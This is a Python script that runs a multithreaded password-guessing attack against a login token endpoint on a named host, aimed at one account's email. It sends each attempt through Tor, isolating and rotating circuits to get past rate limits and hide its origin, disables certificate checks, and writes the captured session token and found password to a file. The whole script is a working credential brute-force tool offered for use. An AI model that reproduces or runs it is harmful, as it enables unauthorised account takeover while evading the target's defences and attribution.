#!/usr/bin/env python3
"""Tor credential trial with circuit reuse: each worker uses a SOCKS-isolated
circuit for up to PER_CIRCUIT attempts, then rotates to a new circuit.
Fresh circuit on 429/timeout. Stops on HTTP 200, saves session to /tmp/brute_result.json.
"""
import ssl, json, time, os, queue, threading, itertools, sys

HOST = "cdn.onlyfakeai.ru"
PATH = "/auth/v1/token?grant_type=password"
APIKEY = "<publishable-key>"
EMAIL = os.environ.get("EMAIL", "onlyfake@tuta.io")
PWFILE = os.environ.get("PWFILE", "/tmp/ops_queue.txt")
RESULT = "/tmp/brute_result.json"
LOG = "/tmp/brute3.log"
THREADS = int(os.environ.get("THREADS", "8"))
PER_CIRCUIT = int(os.environ.get("PER_CIRCUIT", "12"))

ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
stop = threading.Event()
counters = {"n": 0, "ok": 0, "err": 0, "throttled": 0}
lock = threading.Lock()
t0 = time.time()


def log(msg):
    with lock:
        line = f"{time.strftime('%H:%M:%S')} {msg}"
        print(line, flush=True)
        with open(LOG, "a", encoding="utf-8") as f:
            f.write(line + "\n")


def open_conn(username):
    import socks
    s = socks.socksocket()
    s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050, username=username, password="x")
    s.settimeout(25)
    s.connect((HOST, 443))
    ss = ctx.wrap_socket(s, server_hostname=HOST)
    return ss


def do_request(ss, pw):
    body = json.dumps({"email": EMAIL, "password": pw}).encode()
    raw = (f"POST {PATH} HTTP/1.1\r\nHost: {HOST}\r\n"
           "Content-Type: application/json\r\n"
           f"apikey: {APIKEY}\r\n"
           "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/140.0\r\n"
           f"Content-Length: {len(body)}\r\nConnection: keep-alive\r\n\r\n").encode() + body
    ss.sendall(raw)
    buf = b""
    while b"\r\n\r\n" not in buf:
        chunk = ss.recv(4096)
        if not chunk:
            raise ConnectionError("closed")
        buf += chunk
    head, _, rest = buf.partition(b"\r\n\r\n")
    lines = head.split(b"\r\n")
    status = int(lines[0].split()[1])
    clen = None
    for line in lines[1:]:
        if line.lower().startswith(b"content-length:"):
            clen = int(line.split(b":")[1].strip())
    data = rest
    while clen is not None and len(data) < clen:
        chunk = ss.recv(4096)
        if not chunk:
            break
        data += chunk
    return status, data


def worker(wid):
    ss = None
    used = 0
    rot = 0
    while not stop.is_set():
        try:
            pw = q.get_nowait()
        except queue.Empty:
            break
        if ss is None or used >= PER_CIRCUIT:
            try:
                if ss is not None:
                    try: ss.close()
                    except Exception: pass
                rot += 1
                ss = open_conn(f"w{wid}r{rot}")
                used = 0
            except Exception:
                ss = None
                with lock: counters["err"] += 1
                time.sleep(1)
                continue
        try:
            code, data = do_request(ss, pw)
            used += 1
        except Exception:
            with lock: counters["err"] += 1
            try: ss.close()
            except Exception: pass
            ss = None
            used = 0
            continue
        with lock:
            counters["n"] += 1
            n = counters["n"]
            if n % 50 == 0:
                rate = n / max(1e-9, time.time() - t0)
                log(f"{n} tried, {rate:.2f}/s, counts={counters}")
        if code == 200:
            try:
                sess = json.loads(data); sess["_email"] = EMAIL; sess["_password"] = pw
                open(RESULT, "w", encoding="utf-8").write(json.dumps(sess))
                log(f"SUCCESS password={pw!r}")
            except Exception as e:
                log(f"200 but decode error {e}")
            stop.set()
            break
        elif code == 429:
            with lock: counters["throttled"] += 1
            try: ss.close()
            except Exception: pass
            ss = None
            time.sleep(2)
        elif code >= 500:
            with lock: counters["err"] += 1
            time.sleep(1)
    if ss is not None:
        try: ss.close()
        except Exception: pass


q = queue.Queue()
if __name__ == "__main__":
    pws = [l.rstrip("\n") for l in open(PWFILE, encoding="utf-8", errors="ignore") if l.strip()]
    for p in pws:
        q.put(p)
    log(f"START email={EMAIL} total={len(pws)} threads={THREADS} per_circuit={PER_CIRCUIT}")
    ts = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(THREADS)]
    for t in ts: t.start()
    for t in ts: t.join()
    log(f"DONE tried={counters['n']} ok={counters['ok']} err={counters['err']} throttled={counters['throttled']} elapsed={int(time.time()-t0)}s")
